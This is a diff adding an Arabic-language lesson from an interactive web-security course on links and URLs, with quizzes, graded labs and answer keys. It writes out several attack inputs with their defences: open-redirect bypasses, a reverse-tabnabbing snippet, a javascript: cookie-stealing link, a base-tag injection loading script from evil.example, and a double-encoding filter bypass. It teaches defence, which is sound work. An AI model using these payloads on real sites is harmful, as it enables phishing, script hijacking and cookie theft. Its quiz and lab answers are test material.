@@ -1,0 +1,326 @@
+      <section class="section" id="s04" data-part="الجزء 1 · HTML" data-pk="html" data-nav="الروابط والـ URLs" data-icon="🔗" data-keywords="a href link url absolute relative path resolution fragment anchor id target _blank rel noopener noreferrer tabnabbing mailto tel javascript data blob download base percent encoding open redirect protocol-relative">
+        <div class="section-head">
+          <span class="section-index">04</span>
+          <div>
+            <p class="eyebrow">HTML · الدرس 04</p>
+            <h2>الروابط والـ URLs: من فين لفين بالظبط؟</h2>
+            <p class="lede">الـ «Hyper» في HyperText هو الروابط. و<b>الـ URL</b> نفسه لغة صغيرة ليها parser وقواعد — والفرق بين اللي المطوّر فاكره واللي المتصفح بيعمله فعلًا هو مصدر ثغرات زي <b>open redirect</b> و<b>base hijacking</b> و<b>tabnabbing</b>. في الدرس ده هتبقى تقرا أي URL زي المتصفح بالظبط.</p>
+          </div>
+        </div>
+
+        <h3 class="sub">الـ <code>&lt;a&gt;</code> والـ href</h3>
+        <p><code>&lt;a href="URL"&gt;نص اللينك&lt;/a&gt;</code>. الـ <code>href</code> هو الوجهة، والنص هو اللي المستخدم بيشوفه. <b>النص والوجهة ملهمش علاقة ببعض</b> — ممكن النص يقول <code>bank.example</code> واللينك يروح في حتة تانية خالص (أساس الـ phishing). عشان كده اتعلّم دايمًا تبص على الـ href الحقيقي (hover وشوف شريط الحالة، أو من الـ source).</p>
+        <div class="callout tip reveal"><span class="ci">💡</span><div><strong>نص اللينك لازم يوصف الوجهة</strong><p>«اضغط هنا» نص سيء: قارئ الشاشة بيعرض قايمة اللينكات لوحدها، فـ 10 لينكات اسمهم «اضغط هنا» ملهمش معنى. اكتب «تحميل تقرير نوفمبر (PDF)».</p></div></div>
+
+        <h3 class="sub">تشريح الـ URL — جرّب بنفسك</h3>
+        <div class="widget" data-widget="url"></div>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>الجزء</th><th>مثال</th><th>ملاحظات</th></tr></thead>
+          <tbody>
+            <tr><td><b>scheme</b></td><td><code>https:</code></td><td>البروتوكول. case-insensitive.</td></tr>
+            <tr><td><b>userinfo</b></td><td><code>admin:s3cret@</code></td><td>نادر ومش آمن — بس المتصفح لسه بيفهمه، والـ phishing بيستغله.</td></tr>
+            <tr><td><b>host</b></td><td><code>shop.example</code></td><td>اسم أو IP. case-insensitive. ده (مع الـ scheme والـ port) اللي بيحدد الـ <b>origin</b>.</td></tr>
+            <tr><td><b>port</b></td><td><code>:8443</code></td><td>لو مش مكتوب = الافتراضي (443 لـ https، 80 لـ http).</td></tr>
+            <tr><td><b>path</b></td><td><code>/account/orders.php</code></td><td>case-sensitive غالبًا (حسب السيرفر). الـ <code>../</code> بتتحل قبل الإرسال.</td></tr>
+            <tr><td><b>query</b></td><td><code>?id=42&amp;sort=desc</code></td><td>parameters بتتبعت للسيرفر — أهم مكان للـ input في الـ pentest.</td></tr>
+            <tr><td><b>fragment</b></td><td><code>#invoice</code></td><td><b>مبيتبعتش للسيرفر خالص</b>. للمتصفح بس (و JavaScript يقدر يقراه بـ <code>location.hash</code> — مصدر DOM XSS).</td></tr>
+          </tbody>
+        </table></div>
+
+        <h3 class="sub">Absolute vs Relative</h3>
+        <p>الـ <b>absolute URL</b> فيه scheme (<code>https://…</code>). الـ <b>relative</b> بيتحسب من «الـ base» — اللي هو عادة عنوان الصفحة الحالية. لو الصفحة الحالية <code>https://shop.example/products/shoes/index.html</code>:</p>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>الـ href</th><th>النتيجة</th><th>القاعدة</th></tr></thead>
+          <tbody>
+            <tr><td><code>sale.html</code></td><td><code>https://shop.example/products/shoes/sale.html</code></td><td>نفس الـ directory (بعد آخر <code>/</code>)</td></tr>
+            <tr><td><code>./sale.html</code></td><td>نفس اللي فوق</td><td><code>./</code> = الـ directory الحالي</td></tr>
+            <tr><td><code>../bags/</code></td><td><code>https://shop.example/products/bags/</code></td><td><code>../</code> = directory لفوق</td></tr>
+            <tr><td><code>/login</code></td><td><code>https://shop.example/login</code></td><td>بيبدأ بـ <code>/</code> = من الـ root بتاع نفس الـ host</td></tr>
+            <tr><td><code>//cdn.example/x.js</code></td><td><code>https://cdn.example/x.js</code></td><td><b>protocol-relative</b>: نفس الـ scheme بس <b>host تاني</b>!</td></tr>
+            <tr><td><code>?page=2</code></td><td><code>…/shoes/index.html?page=2</code></td><td>نفس الـ path، query جديدة</td></tr>
+            <tr><td><code>#reviews</code></td><td><code>…/shoes/index.html#reviews</code></td><td>نفس الصفحة، مكان تاني فيها</td></tr>
+          </tbody>
+        </table></div>
+        <p>جرّب: المعاينة دي «عنوانها» <code>https://shop.example/products/shoes/index.html</code>. دوس على كل لينك وبص في الـ log تحت — هتلاقي الـ URL النهائي والـ <code>Referer</code> اللي كان هيتبعت:</p>
+        <html-example file="relative.html" auto url="https://shop.example/products/shoes/index.html">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>Shoes</title></head>
+          <body>
+            <ul>
+              <li><a href="sale.html">sale.html</a></li>
+              <li><a href="../bags/">../bags/</a></li>
+              <li><a href="/login?next=/cart">/login?next=/cart</a></li>
+              <li><a href="//cdn.example/x.js">//cdn.example/x.js</a></li>
+              <li><a href="?page=2">?page=2</a></li>
+              <li><a href="https://partner.example/deal">https://partner.example/deal</a></li>
+              <li><a href="#reviews">#reviews</a></li>
+            </ul>
+            <h3 id="reviews">Reviews</h3>
+          </body>
+          </html>
+        </html-example>
+        <p>لاحظ الـ <code>Referer</code>: للينكات اللي على نفس الموقع بيتبعت الـ URL كامل، وللينك الخارجي (<code>partner.example</code>) بيتبعت الـ <b>origin بس</b> (<code>https://shop.example/</code>). ده سلوك الـ default policy في المتصفحات الحديثة (<code>strict-origin-when-cross-origin</code>) — وهنتحكم فيه في درس الـ head.</p>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>Open redirect: «بيبدأ بـ / يبقى آمن»… غلط</strong><p>موقع بيعمل redirect لـ <code>?next=</code> بعد الـ login، والمطوّر «حمى» نفسه بإنه يتأكد إن القيمة بتبدأ بـ <code>/</code>. المهاجم يبعت <code>next=//evil.example</code> — بتبدأ بـ <code>/</code> فعلًا، بس المتصفح بيقراها protocol-relative ويروح <code>evil.example</code>. وفي المتصفحات <code>/\evil.example</code> كمان بتشتغل لأن الـ <code>\</code> بتتعامل زي <code>/</code> في URLs الـ http. جرّبهم في الـ URL Inspector فوق.</p></div></div>
+
+        <h3 class="sub">الـ Fragments والـ ids</h3>
+        <p>أي عنصر عليه <code>id="x"</code> تقدر تعمله لينك بـ <code>#x</code> — المتصفح بيعمل scroll ليه من غير ما يطلب حاجة من السيرفر (و<code>#top</code> أو <code>#</code> بيطلعوك لأول الصفحة). الـ fragment ده للمتصفح بس: <b>مبيظهرش في الـ request ولا في logs السيرفر</b>. وفيه كمان <b>text fragments</b> في Chrome: <code>#:~:text=كلمة</code> بتعمل scroll وhighlight لكلمة في الصفحة.</p>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>ليه الـ fragment مهم أمنيًا؟</strong><p>(1) بما إنه مبيتبعتش للسيرفر، الـ WAF والـ logs مبيشوفوش أي payload فيه. (2) لو JavaScript في الصفحة بياخد <code>location.hash</code> ويحطه في الـ DOM، يبقى عندك <b>DOM XSS</b> مايبانش في أي request. (3) الـ OAuth القديم (implicit flow) كان بيرجّع الـ <code>access_token</code> في الـ fragment.</p></div></div>
+
+        <h3 class="sub">target وrel: فين يتفتح، وبأي علاقة</h3>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>القيمة</th><th>المعنى</th></tr></thead>
+          <tbody>
+            <tr><td><code>target="_self"</code></td><td>نفس الـ tab/frame (الافتراضي)</td></tr>
+            <tr><td><code>target="_blank"</code></td><td>tab/window جديد</td></tr>
+            <tr><td><code>target="_parent"</code> / <code>"_top"</code></td><td>الـ frame الأب / أعلى نافذة (للـ iframes)</td></tr>
+            <tr><td><code>target="name"</code></td><td>نافذة أو iframe بالاسم ده (ولو مش موجودة تتفتح جديدة بالاسم ده)</td></tr>
+            <tr><td><code>rel="noopener"</code></td><td>الصفحة الجديدة متاخدش reference للصفحة القديمة (<code>window.opener = null</code>)</td></tr>
+            <tr><td><code>rel="noreferrer"</code></td><td>مفيش <code>Referer</code> يتبعت + (ضمنيًا noopener)</td></tr>
+            <tr><td><code>rel="nofollow"</code> / <code>"ugc"</code> / <code>"sponsored"</code></td><td>رسائل لمحركات البحث (لينك مش موثوق / كتبه مستخدم / إعلان)</td></tr>
+          </tbody>
+        </table></div>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>Reverse tabnabbing</strong><p>زمان: لينك <code>target="_blank"</code> لموقع المهاجم كان بيدّي الصفحة الجديدة <code>window.opener</code> — فتقدر تعمل <code>opener.location = "https://bank-login.example"</code> وتغيّر الـ tab الأصلي لصفحة phishing وهو في الخلفية! المتصفحات الحديثة (Chrome 88+، Firefox 79+، Safari 12.1+) بقت تعتبر <code>target="_blank"</code> = <code>noopener</code> تلقائيًا. بس <code>window.open()</code> من JavaScript لسه بيدّي opener، والتطبيقات القديمة/الـ webviews ممكن تكون عرضة — فاكتب <code>rel="noopener noreferrer"</code> صراحة، وفي الـ pentest دوّر على الحالات اللي الـ opener فيها لسه موجود.</p></div></div>
+
+        <h3 class="sub">Schemes غير http</h3>
+        <html-example file="schemes.html" auto>
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>Schemes</title></head>
+          <body>
+            <p><a href="mailto:security@shop.example?subject=Bug%20report">Report a bug</a></p>
+            <p><a href="tel:+201000000000">Call support</a></p>
+            <p><a href="data:text/plain,hello">data: URL</a></p>
+            <p><a href="javascript:alert('runs in this page!')">javascript: URL</a></p>
+            <p><a href="files/report.pdf" download="Q4-report.pdf">Download report</a></p>
+          </body>
+          </html>
+        </html-example>
+        <ul>
+          <li><code>mailto:</code> / <code>tel:</code> / <code>sms:</code>: بيفتحوا برنامج الإيميل أو الاتصال. في الـ <code>mailto</code> تقدر تحط <code>?subject=</code> و<code>&amp;body=</code> (percent-encoded).</li>
+          <li><code>javascript:</code>: لما تدوس، الكود <b>بيتنفّذ في سياق الصفحة الحالية</b>. أي موقع بيسمح للمستخدم يحط «لينك الويبسايت بتاعه» من غير ما يتأكد من الـ scheme = stored XSS.</li>
+          <li><code>data:</code>: المحتوى نفسه جوه الـ URL. المتصفحات الحديثة بتمنع إن صفحة تودّيك لـ <code>data:</code> URL في الـ tab الرئيسي (كان بيستخدم في الـ phishing)، بس <code>data:</code> لسه شغال في الصور والـ iframes وغيرها.</li>
+          <li><code>download="name"</code>: بدل ما يفتح الملف، ينزّله بالاسم ده. بيشتغل للـ <b>same-origin</b> URLs وللـ <code>blob:</code> و<code>data:</code> بس؛ لأي origin تاني المتصفح بيتجاهله. 🦠 ده بالظبط اللي الـ <b>HTML smuggling</b> بيستخدمه: يبني الملف في JavaScript كـ <code>blob:</code> ويعمله download.</li>
+        </ul>
+
+        <h3 class="sub">الـ <code>&lt;base&gt;</code>: تغيير مرجع كل الـ relative URLs</h3>
+        <p><code>&lt;base href="https://cdn.example/v2/"&gt;</code> جوه الـ head بيخلّي <b>كل</b> relative URL في الصفحة (لينكات، صور، scripts، forms) يتحسب منه بدل عنوان الصفحة. ممكن كمان <code>&lt;base target="_blank"&gt;</code>. القاعدة: <b>أول</b> <code>base</code> عليه <code>href</code> هو اللي بيتحسب، والباقي متجاهل.</p>
+        <html-example file="base.html" auto url="https://shop.example/account/index.html">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <base href="https://static.shop.example/v2/">
+            <base href="https://ignored.example/">
+            <title>Base</title>
+          </head>
+          <body>
+            <a href="help.html">help.html</a> ·
+            <a href="/login">/login</a> ·
+            <a href="#top">#top</a>
+          </body>
+          </html>
+        </html-example>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>Base tag injection</strong><p>لو عندك HTML injection في الـ head (أو قبل أي script)، ومش قادر تحط <code>&lt;script&gt;</code> بسبب فلتر — جرّب <code>&lt;base href="https://evil.example/"&gt;</code>. أي <code>&lt;script src="/static/app.js"&gt;</code> بعدها هيتحمّل من <code>https://evil.example/static/app.js</code> = سيرفرك = كودك بيشتغل. الحماية: CSP فيها <code>base-uri 'none'</code> أو <code>'self'</code>.</p></div></div>
+
+        <h3 class="sub">الـ Percent-encoding</h3>
+        <p>الـ URL مسموح فيه حروف ASCII معينة بس. أي حاجة تانية (مسافة، عربي، أو حرف ليه معنى خاص زي <code>&amp;</code> و<code>#</code> و<code>?</code> لو عايزه كقيمة) بتتكتب <code>%HH</code> = الـ byte بالـ hex. الحروف غير الـ ASCII بتتحول <b>UTF-8 bytes</b> الأول: «ا» = <code>%D8%A7</code>.</p>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>الحرف</th><th>encoded</th><th>ليه</th></tr></thead>
+          <tbody>
+            <tr><td>مسافة</td><td><code>%20</code> (أو <code>+</code> في query الفورمز)</td><td>المسافة مش مسموحة. الـ <code>+</code> = مسافة في <code>application/x-www-form-urlencoded</code> بس</td></tr>
+            <tr><td><code>&amp;</code> <code>=</code></td><td><code>%26</code> <code>%3D</code></td><td>لو جوه قيمة parameter، وإلا هيتفهموا كفاصل</td></tr>
+            <tr><td><code>#</code> <code>?</code></td><td><code>%23</code> <code>%3F</code></td><td><code>#</code> غير مُرمّز بيقطع الـ URL (كل اللي بعده fragment)</td></tr>
+            <tr><td><code>/</code></td><td><code>%2F</code></td><td>جوه قيمة (زي <code>next=%2Fcart</code>)</td></tr>
+            <tr><td><code>&lt;</code> <code>&gt;</code> <code>"</code></td><td><code>%3C</code> <code>%3E</code> <code>%22</code></td><td>المتصفح بيعملهم encode تلقائيًا في الـ path والـ query</td></tr>
+            <tr><td><code>%</code> نفسه</td><td><code>%25</code></td><td>🎯 <b>double encoding</b>: <code>%253C</code> → (decode) <code>%3C</code> → (decode تاني) <code>&lt;</code>. فلتر بيعمل decode مرة والـ app مرتين = bypass</td></tr>
+          </tbody>
+        </table></div>
+
+        <div class="exercises">
+          <div class="exercises-head"><h3><span class="bulb">✏️</span> تمارين الدرس 04</h3></div>
+          <quiz id="s04-q1" answer="2">
+            <q>المستخدم فتح `https://shop.example/search?q=shoes#results`. إيه اللي بيوصل للسيرفر؟</q>
+            <o>`/search?q=shoes#results`</o>
+            <o>`/search` بس</o>
+            <o>`/search?q=shoes`</o>
+            <o>`#results` بس</o>
+            <good>الـ fragment (`#…`) بيفضل في المتصفح. السيرفر بيشوف الـ path والـ query بس.</good>
+            <bad>الـ fragment عمره ما بيتبعت في الـ HTTP request. الـ path والـ query هما اللي بيتبعتوا.</bad>
+          </quiz>
+          <quiz id="s04-q2" answer="0">
+            <q>الصفحة الحالية `https://a.example/x/y/page.html`. لينك `href="../z.html"` هيروح فين؟</q>
+            <o>`https://a.example/x/z.html`</o>
+            <o>`https://a.example/z.html`</o>
+            <o>`https://a.example/x/y/z.html`</o>
+            <o>`https://a.example/x/y/../z.html` زي ما هو</o>
+            <good>الـ directory الحالي `/x/y/`، و`../` بتطلع لـ `/x/`. والـ `..` بتتحل قبل الإرسال.</good>
+            <bad>ابدأ من الـ directory (`/x/y/`)، اطلع مستوى واحد (`/x/`)، وضيف `z.html`.</bad>
+          </quiz>
+          <quiz id="s04-q3" answer="3">
+            <q>السيرفر بيسمح بأي `next` بيبدأ بـ `/` عشان «يمنع» الـ redirect لمواقع تانية. أنهي قيمة هتودّي المستخدم لـ `evil.example`؟</q>
+            <o>`/evil.example`</o>
+            <o>`/./evil.example`</o>
+            <o>`/%65vil.example`</o>
+            <o>`//evil.example`</o>
+            <good>`//evil.example` protocol-relative: نفس الـ scheme، host مختلف. (و`/\evil.example` كمان بتشتغل في المتصفحات.) الحل الصح: allow-list للـ paths، أو parse الـ URL والتأكد إن الـ origin هو نفسه.</good>
+            <bad>`/evil.example` و`/./evil.example` paths عادية على نفس الموقع. الـ `//` في الأول هي اللي بتخلّي اللي بعدها host.</bad>
+          </quiz>
+          <quiz id="s04-q4" answer="1">
+            <q>إيه الفرق بين `rel="noopener"` و`rel="noreferrer"`؟</q>
+            <o>مفيش فرق</o>
+            <o>`noopener` بيقطع `window.opener` بس، و`noreferrer` بيمنع الـ `Referer` header + بيعمل noopener كمان</o>
+            <o>`noreferrer` بيمنع فتح tab جديد</o>
+            <o>`noopener` بيمنع الـ cookies</o>
+            <good>صح. والاتنين مع بعض هو الاختيار الآمن للينكات الخارجية.</good>
+            <bad>`noopener` = الصفحة الجديدة ملهاش reference لصفحتك. `noreferrer` = كمان مفيش Referer (وضمنيًا noopener).</bad>
+          </quiz>
+          <quiz id="s04-q5" answer="2">
+            <q>في صفحة فيها `<base href="https://evil.example/">` قبل `<script src="/app.js">`. الـ script هيتحمّل منين؟</q>
+            <o>من الموقع الأصلي `/app.js`</o>
+            <o>مش هيتحمّل خالص</o>
+            <o>`https://evil.example/app.js`</o>
+            <o>من الاتنين</o>
+            <good>الـ base بيغيّر مرجع كل الـ relative URLs، والـ `/app.js` بقت تتحسب من `evil.example`. عشان كده `base-uri` في الـ CSP مهم.</good>
+            <bad>`/app.js` relative URL (بيبدأ بـ `/` بس مفيهوش host)، فبيتحسب من الـ base → `https://evil.example/app.js`.</bad>
+          </quiz>
+          <quiz id="s04-q6" answer="0">
+            <q>موقع بيعرض «الويبسايت الشخصي» لكل مستخدم كـ `<a href="USER_INPUT">`، وبيعمل HTML-encode صح للـ input. مستخدم كتب `javascript:alert(document.cookie)`. فيه مشكلة؟</q>
+            <o>أيوه — الـ encoding مبيغيّرش الـ scheme. لما حد يدوس، الكود يتنفّذ. لازم allow-list للـ schemes</o>
+            <o>لأ، الـ encoding بيحمي من كل حاجة</o>
+            <o>لأ، المتصفحات بتمنع javascript: في الـ href</o>
+            <o>أيوه بس بس لو الصفحة HTTP</o>
+            <good>القيمة مفيهاش أي حرف خاص بـ HTML عشان يتعمله encode. المشكلة في <b>معنى</b> القيمة كـ URL. الحل: اقبل `http:`/`https:` بس بعد ما تعمل parse للـ URL.</good>
+            <bad>HTML encoding بيمنع الخروج من الـ attribute، بس `javascript:alert(…)` مش محتاجة تخرج — هي URL صالح بيشغّل كود. المتصفحات لسه بتنفّذ `javascript:` في اللينكات.</bad>
+          </quiz>
+          <quiz id="s04-q7" answer="3">
+            <q>فلتر بيعمل URL-decode مرة واحدة ويدوّر على `<`. الـ app بعدها بيعمل decode مرة تانية. أنهي input هيعدّي الفلتر ويطلع `<` في الآخر؟</q>
+            <o>`<`</o>
+            <o>`%3C`</o>
+            <o>`&lt;`</o>
+            <o>`%253C`</o>
+            <good>`%253C` → الفلتر يفكها `%3C` (مفيش `<`، يعدّيها) → الـ app يفكها `<`. ده double encoding.</good>
+            <bad>`%3C` الفلتر هيفكها `<` ويمسكها. `%25` = `%`، فـ `%253C` محتاجة decode مرتين عشان تبقى `<` — يعني تعدّي الفلتر اللي بيفك مرة واحدة.</bad>
+          </quiz>
+
+          <html-lab id="s04-lab1" title="Navigation لتقرير pentest" level="1" url="https://shop.example/app/dashboard/index.html">
+            <desc><p>الصفحة دي عنوانها <code>https://shop.example/app/dashboard/index.html</code>. اعمل جوه <code>nav</code> أربع لينكات:</p>
+            <ul><li>لينك لـ <code>https://docs.example/</code> يفتح في <b>tab جديدة</b> وعليه <code>rel="noopener noreferrer"</code>.</li>
+            <li>لينك <b>relative</b> يوصل لـ <code>https://shop.example/app/reports/latest.html</code> باستخدام <code>../</code>.</li>
+            <li>لينك لـ <code>#findings</code>، وعنصر في الصفحة عليه <code>id="findings"</code>.</li>
+            <li>لينك إيميل لـ <code>security@shop.example</code>.</li></ul>
+            <p>جرّب كل لينك في المعاينة واتأكد من الـ URL النهائي في الـ log.</p></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Dashboard</title></head>
+              <body>
+                <nav>
+                  <!-- 4 links here -->
+                </nav>
+                <h2>Findings</h2>
+                <p>3 issues found.</p>
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Dashboard</title></head>
+              <body>
+                <nav>
+                  <a href="https://docs.example/" target="_blank" rel="noopener noreferrer">Docs</a>
+                  <a href="../reports/latest.html">Latest report</a>
+                  <a href="#findings">Findings</a>
+                  <a href="mailto:security@shop.example">Contact security</a>
+                </nav>
+                <h2 id="findings">Findings</h2>
+                <p>3 issues found.</p>
+              </body>
+              </html>
+            </solution>
+            <test label="لينك docs.example في tab جديدة مع `noopener` و`noreferrer`">$$("nav a").some(a => a.getAttribute("href") === "https://docs.example/" && a.getAttribute("target") === "_blank" && /\bnoopener\b/.test(a.rel) && /\bnoreferrer\b/.test(a.rel))</test>
+            <test label="لينك relative بـ `../` بيوصل لـ /app/reports/latest.html">$$("nav a").some(a => { const h = a.getAttribute("href") || ""; return h.startsWith("../") && new URL(h, "https://shop.example/app/dashboard/index.html").href === "https://shop.example/app/reports/latest.html"; })</test>
+            <test label="لينك `#findings` وعنصر عليه `id=&quot;findings&quot;`">$$("nav a").some(a => a.getAttribute("href") === "#findings") && has("#findings")</test>
+            <test label="لينك `mailto:` لـ security@shop.example">$$("nav a").some(a => /^mailto:security@shop\.example(\?|$)/i.test(a.getAttribute("href") || ""))</test>
+            <hint>من `/app/dashboard/` لـ `/app/reports/` محتاج تطلع مستوى واحد: `../reports/latest.html`.</hint>
+          </html-lab>
+
+          <html-lab id="s04-lab2" title="انقل الـ assets لـ CDN بـ base" level="2" url="https://shop.example/blog/post.html">
+            <desc><p>الصفحة فيها لينكات وصور relative. المطلوب تخلّي <b>كل</b> الـ relative URLs تتحسب من <code>https://cdn.shop.example/v2/</code> من غير ما تعدّلهم واحد واحد، بشرط:</p>
+            <ul><li>الـ <code>base</code> يبقى في الـ <code>head</code> و<b>قبل أي عنصر عليه href أو src</b>.</li>
+            <li>لينك «Home» لازم يفضل رايح لـ <code>https://shop.example/</code> بالظبط (يعني خليه absolute).</li></ul></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <title>Post</title>
+                <link rel="stylesheet" href="css/blog.css">
+              </head>
+              <body>
+                <a class="home" href="/">Home</a>
+                <img class="logo" src="img/logo.svg" alt="Shop logo">
+                <a class="next" href="posts/2.html">Next post</a>
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <base href="https://cdn.shop.example/v2/">
+                <title>Post</title>
+                <link rel="stylesheet" href="css/blog.css">
+              </head>
+              <body>
+                <a class="home" href="https://shop.example/">Home</a>
+                <img class="logo" src="img/logo.svg" alt="Shop logo">
+                <a class="next" href="posts/2.html">Next post</a>
+              </body>
+              </html>
+            </solution>
+            <test label="فيه `base` في الـ head بالـ href المطلوب">has("head > base") && attr("head > base", "href") === "https://cdn.shop.example/v2/"</test>
+            <test label="الـ `base` قبل أي عنصر عليه href/src">$("[href],[src]") === $("base")</test>
+            <test label="الصورة هتتحمّل من cdn.shop.example/v2/img/logo.svg">new URL(attr("img.logo", "src"), attr("base", "href") || "https://shop.example/blog/post.html").href === "https://cdn.shop.example/v2/img/logo.svg"</test>
+            <test label="«Home» لسه رايح https://shop.example/">new URL(attr("a.home", "href"), attr("base", "href") || "https://shop.example/blog/post.html").href === "https://shop.example/"</test>
+            <hint>`/` relative URL برضه — مع الـ base هتبقى `https://cdn.shop.example/`. خليها absolute. وحط الـ `base` قبل الـ `link`.</hint>
+          </html-lab>
+
+          <task id="s04-t1" title="حلّ الـ relative URL" level="2" answer="https://shop.example/d/e.html?x=1" reject="https://shop.example/d/e.html?x=1#y">
+            <desc><p>الصفحة: <code>https://shop.example/a/b/c.html</code>. فيها لينك <code>href="../../d/./e.html?x=1#y"</code>. اكتب الـ URL اللي <b>هيتطلب من السيرفر</b> فعلًا.</p></desc>
+            <hint>الـ directory `/a/b/` ← `../` ← `../`… والـ fragment بيتبعت؟</hint>
+            <explain>`/a/b/` → `../` = `/a/` → `../` = `/` → `d/./e.html` = `/d/e.html`. والـ query بتتبعت، والـ `#y` لأ. النتيجة: `https://shop.example/d/e.html?x=1`.</explain>
+          </task>
+          <task id="s04-t2" title="الـ script هيتحمّل منين؟" level="2" answer="https://evil.example/static/app.js">
+            <desc><p>الصفحة <code>https://shop.example/search?q=…</code> بتحط كلمة البحث جوه <code>content</code> بتاع meta tag. الفلتر بيمسح أي <code>&lt;script</code>، فبعت payload تاني. ده الـ HTML اللي رجع. الـ <code>app.js</code> هيتحمّل من أنهي URL؟</p></desc>
+            <listing lang="html" file="response.html">
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <meta name="description" content="Search results for: "><base href="https://evil.example/">">
+                <title>Search</title>
+                <script src="/static/app.js"></script>
+              </head>
+            </listing>
+            <hint>الـ `"` في الـ payload قفلت قيمة الـ `content`، والـ `>` قفلت الـ meta. يعني اللي بعدها element جديد فعلًا.</hint>
+            <explain>الـ payload `"><base href="https://evil.example/">` خرج من الـ attribute وعمل `base` element حقيقي في الـ head — قبل الـ script. فـ `/static/app.js` بقت `https://evil.example/static/app.js` = كود المهاجم. ده <b>base tag hijacking</b>، وبيشتغل حتى لو كل الـ `&lt;script` ممنوعة. الدفاع: encoding صح للـ `"` جوه الـ attribute + CSP بـ `base-uri 'none'`.</explain>
+          </task>
+          <task id="s04-t3" title="نفس الـ payload… في مكان تاني" level="3" answer="https://shop.example/static/app.js" reject="https://evil.example/static/app.js">
+            <desc><p>صفحة تانية على نفس الموقع (<code>https://shop.example/search?q=…</code>) بتحط كلمة البحث جوه الـ <code>title</code>، ومن غير أي encoding. المهاجم بعت نفس الفكرة. الـ <code>app.js</code> هيتحمّل من أنهي URL المرة دي؟</p></desc>
+            <listing lang="html" file="response2.html">
+              <!DOCTYPE html>
+              <html lang="en">
+              <head>
+                <meta charset="UTF-8">
+                <title>Results for: <base href="https://evil.example/"></title>
+                <script src="/static/app.js"></script>
+              </head>
+            </listing>
+            <hint>المتصفح بيقرا اللي جوه `<title>` إزاي؟ هل ممكن يتعمل element جوّاه؟ (فكّر في `<textarea>`.)</hint>
+            <explain>`https://shop.example/static/app.js`. الـ `title` عنصر <b>RCDATA</b>: الـ tokenizer جواه مبيعرفش tags خالص — كل حاجة نص لحد `</title>`. فالـ `<base …>` بقى مجرد كلام في عنوان الـ tab، ومفيش base element. عشان تستغل الـ injection ده لازم الأول <b>تقفل</b> الـ title: `</title><base href=…>`. ده مثال على إن «فين» الـ input واقع (الـ context) بيحدد كل حاجة — هنشوف الـ tokenizer بعينك في الدرس 13.</explain>
+          </task>
+        </div>
+      </section>
